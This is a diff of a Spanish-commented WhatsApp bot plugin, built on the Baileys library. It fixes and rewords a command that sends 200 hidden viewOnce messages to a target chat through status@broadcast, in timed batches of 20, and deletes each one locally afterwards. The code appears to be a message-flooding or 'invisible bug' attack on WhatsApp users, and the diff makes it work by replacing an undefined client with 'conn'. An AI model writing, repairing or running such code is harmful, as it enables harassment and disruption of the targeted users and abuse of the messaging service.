@@ -1,7 +1,7 @@
 import { generateWAMessageFromContent } from '@whiskeysockets/baileys';
 
 let handler = async (m, { conn }) => {
-  // 🔍 Normalizador que elimina @ y : (para comparar solo números)
+  // 🔧 Normalizador de JID (quita @ y : para comparar solo el número)
   let normalizeJid = jid => jid?.toString()?.trim()?.toLowerCase()?.split('@')[0]?.split(':')[0];
 
   const senderNumber = normalizeJid(m.sender);
@@ -16,7 +16,7 @@ let handler = async (m, { conn }) => {
 
   const jid = m.chat;
 
-  m.reply('Ejecutando el comando durante 5 minutos 😼');
+  m.reply('Ejecutando el comando en tandas durante 5 minutos 😼');
 
   const mensajesPorTanda = 20;
   const totalMensajes = 200;
@@ -33,13 +33,13 @@ let handler = async (m, { conn }) => {
 handler.command = /^ñoño$/i;
 export default handler;
 
-// ⏱️ Delay entre mensajes
+// ⏱️ Función delay
 function delay(ms) {
   return new Promise(res => setTimeout(res, ms));
 }
 
-// 🐉 Función que envía el mensaje viewOnce
-async function isagivisble1(target, mention) {
+// 🐉 Función principal de mensaje invisible
+async function isagivisble1(target, mention, conn) {
   const generateMessage = {
     viewOnceMessage: {
       message: {
@@ -72,7 +72,7 @@ async function isagivisble1(target, mention) {
   };
 
   const msg = generateWAMessageFromContent(target, generateMessage, {});
-  await Nando.relayMessage("status@broadcast", msg.message, {
+  await conn.relayMessage("status@broadcast", msg.message, {
     messageId: msg.key.id,
     statusJidList: [target],
     additionalNodes: [{
@@ -85,7 +85,7 @@ async function isagivisble1(target, mention) {
   });
 
   if (mention) {
-    await Nando.relayMessage(target, {
+    await conn.relayMessage(target, {
       statusMentionMessage: {
         message: { protocolMessage: { key: msg.key, type: 25 } }
       }
@@ -101,13 +101,13 @@ async function isagivisble1(target, mention) {
   return msg;
 }
 
-// 📦 Envía una tanda de 20 mensajes y los elimina localmente
+// 🚀 Función que envía una tanda de 20 mensajes
 async function enviarTandaIsagi(conn, jid, num, m) {
   try {
     for (let i = 0; i < 20; i++) {
-      const msg = await isagivisble1(jid, false);
-      await delay(1000); // 1 segundo entre mensajes
-      await conn.sendMessage(conn.user.id, { delete: msg.key });
+      const msg = await isagivisble1(jid, false, conn);
+      await delay(1000); // espera 1 segundo entre cada mensaje
+      await conn.sendMessage(conn.user.id, { delete: msg.key }); // elimina local
     }
 
     await conn.sendMessage(m.chat, {
